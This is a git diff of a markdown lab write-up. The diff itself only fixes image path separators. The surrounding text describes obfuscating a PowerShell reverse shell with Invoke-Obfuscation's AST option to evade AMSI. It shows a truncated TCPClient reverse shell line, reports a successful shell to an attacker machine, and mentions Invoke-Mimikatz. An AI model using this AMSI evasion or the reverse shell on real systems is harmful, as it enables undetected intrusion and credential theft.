@@ -14,7 +14,7 @@ To obfuscate the command, the tool **Invoke Obfuscation** (https://github.com/da
 
 After setting the "ScriptBlock" as our reverse shell command, we have the option to choose an encoding option
 
-![Options](misc\encodingOptions.png)
+![Options](misc/encodingOptions.png)
 
 We discovered through testing and research that the most effective obfuscation method is **AST**. The regular encoding options, which include encoding the command in ASCII, Binary, and the encryption of the entire command as SecureString, all seem to get detected by AMSI pretty easily.
 
@@ -26,11 +26,11 @@ Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.1
 
 After executing the command on the victim machine, we can see that it did not get detected/blocked by AMSI : 
 
-![Encoded](misc\encoded.png)
+![Encoded](misc/encoded.png)
 
 Back in our attacker machine (kali), we can verify that the reverse shell connection was successful.
 
-![Alt text](misc\revshell.png)
+![Alt text](misc/revshell.png)
 
 However, this method would not be very helpful if the attacker had to run multiple commands. That would mean each command would have to be repeatedly encoded using the Invoke-Obfuscation tool. Thus, this method is better if used to execute one command only (e.g Invoke-Mimikatz)
 
